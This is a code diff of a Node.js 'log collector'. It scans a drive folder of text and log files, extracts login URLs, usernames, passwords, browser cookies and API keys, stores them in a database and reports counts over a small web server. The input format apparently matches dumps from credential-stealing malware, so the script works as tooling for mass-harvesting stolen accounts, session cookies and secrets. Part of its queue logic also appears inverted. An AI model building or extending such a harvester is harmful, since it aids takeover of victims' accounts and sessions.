@@ -1,42 +1,18 @@
 const FindFiles = require("node-find-files");
 const { Signale } = require('signale');
 const { PromisePool } = require('@supercharge/promise-pool');
-const fs = require('fs')
-
-const utilsRegex = require('./matchs.js');
-const DataBase = require('./database');
-
-
-var files = []
-let status = {
-    "cookies": 0,
-    "senhas": 0,
-    "files": 0,
-}
+const fs = require('fs');
+const express = require("express")
 
 
 
+const DataBase = require('./src/database');
+const { utilsRegex, hostList, passList, userList } = require('./src/utils');
 
 
-const userList = [
-    'login',
-    'user',
-
-]
-const hostList = [
-    'host',
-    'url',
-    'uri'
-]
-
-const passList = [
-    'pass',
-]
-
-
-var finder = new FindFiles({
-    rootFolder: "F:\\",
-});
+const app = express()
+app.use(express.json())
+const database = new DataBase()
 
 const Debug = new Signale({
     scope: 'Coletor de logs',
@@ -45,7 +21,28 @@ const Debug = new Signale({
     }
 })
 
+var files = []
+
+
+let status = {
+    cookies: 0,
+    senhas: 0,
+    files: 0,
+    keys: 0
+}
+
+
+
+var finder = new FindFiles({
+    rootFolder: "F:\\novo3\\",
+
+    filterFunction: (str, s) => (str.endsWith(`.txt`) || str.endsWith(".log")) && s.size / (1024 * 1024) < 10
+});
+
+
 const parseItem = (item) => {
+
+    const regOption = /(.*)([\:\=] )(.*)$/s
     let lines = item.split("\n").map(l => l.trimEnd())
     let resp = {
         url: undefined,
@@ -89,7 +86,7 @@ const parseCookies = (cookies) => {
             }
             l = l.trimEnd().split('\t')
 
-            let [domain, name, value] = l
+            let [domain, hostOnly, path, httpOnly, expirationDate, name, value] = l
             if (name == undefined || value == undefined || domain == undefined)
                 return undefined;
 
@@ -97,7 +94,6 @@ const parseCookies = (cookies) => {
             if (domain && domain.includes(' ')) {
                 domain = domain.split(' ')[1]
             }
-
 
 
             return {
@@ -112,45 +108,51 @@ const parseCookies = (cookies) => {
         }
     }).filter(c => c);
 }
-const grabKeys = (data) => {
+const grabKeys = (data) => new Promise((res) => {
 
 
     let result = []
     for (api of utilsRegex) {
         if (api.pattern.test(data)) {
-            result.push({
-                type: "api_key",
-                name: api.name,
-                key: api.pattern.exec(data)[0]
-            })
+            try {
+                result.push({
+                    type: "api_key",
+                    name: api.name,
+                    key: api.pattern.exec(data)[0]
+                })
+            } catch (error) {
+
+            }
+
         }
     }
 
-    return result;
-}
-const grabPassword = (data) => {
+    return res(result)
+})
+const grabPassword = (data) => new Promise((res) => {
     let items = data.split('====').map(parseItem).filter(e => e)
 
-    return items;
-}
-const grabCookies = (data) => {
+    return res(items);
+})
+const grabCookies = (data) => new Promise((res) => {
     let items = data.split('====').map(parseCookies).filter(e => e);
 
-    return items[0];
-}
+    return res(items[0]);
+})
 
 async function solverFiles() {
-    if (files.length == 0)
-        return;
+    if (files.length !== 0)
+        return setTimeout(solverFiles, 1000)
 
     let dataArray = [...files];
     files = [];
 
+
     await PromisePool
-        .withConcurrency(500)
+        .withConcurrency(200)
         .for(dataArray)
         .handleError((e, file) => {
-            Debug.error(file, e.message)
+            Debug.error(file, e)
             fs.appendFileSync('errors.log', `${file} => ${e.message}\n`);
         })
         .process(async (file) => {
@@ -158,14 +160,17 @@ async function solverFiles() {
             status.files++;
             let hash = Buffer.from(file).toString('base64');
             let resLogins = await grabPassword(data).then(async r => {
+                status.senhas += r.length
                 await database.addLogins(r);
                 return r;
             });
             let resCookies = await grabCookies(data).then(async r => {
+                status.cookies += r.length
                 await database.addCookies(r);
                 return r;
             });
             let resKeys = await grabKeys(data).then(async r => {
+                status.keys += r.length
                 await database.addKeys(r);
                 return r;
             });
@@ -178,43 +183,47 @@ async function solverFiles() {
                     result,
                     length: result.length
                 })
-                  console.clear();
-            console.table(status);
-            Debug.success(file, result.length, "encontrado.")
+                console.clear();
+                console.table({ ...status, total: files.length });
+                Debug.success(file, result.length, "encontrado.")
             }
-      
+
         })
+    setTimeout(solverFiles, 2000)
+}
 
+function onMatch(strPath, stat) {
+    if (strPath.endsWith(`.txt`) || strPath.endsWith(`.log`)) {
+        files.push(strPath);
+        Debug.success(strPath)
+    }
 
+}
+function onComplete() {
+    Debug.success("Finished")
+}
+function onPathError(err, strPath) {
+    Debug.error("Error for Path " + strPath + " " + err)
+}
+function onError(err){
+    Debug.fatal("Global Error " + err);
 }
 async function main() {
-
-
-
     await database.start();
-
     Debug.success("Database conectada.")
 
-
-
-
-
-    finder.on("match", function (strPath, stat) {
-        files.push(strPath);
-    })
-    finder.on("complete", function () {
-        Debug.success("Finished")
-    })
-    finder.on("patherror", function (err, strPath) {
-        Debug.error("Error for Path " + strPath + " " + err)
-    })
-    finder.on("error", function (err) {
-        Debug.fatal("Global Error " + err);
-    })
+    finder.on("match", onMatch)
+    finder.on("complete", onComplete)
+    finder.on("patherror", onPathError)
+    finder.on("error", onError)
     finder.startSearch();
 
-
-
-
-
+    setTimeout(solverFiles, 5000)
 }
+main();
+
+
+app.get("/", (req, res) => {
+    return res.json(status)
+})
+app.listen(1504)
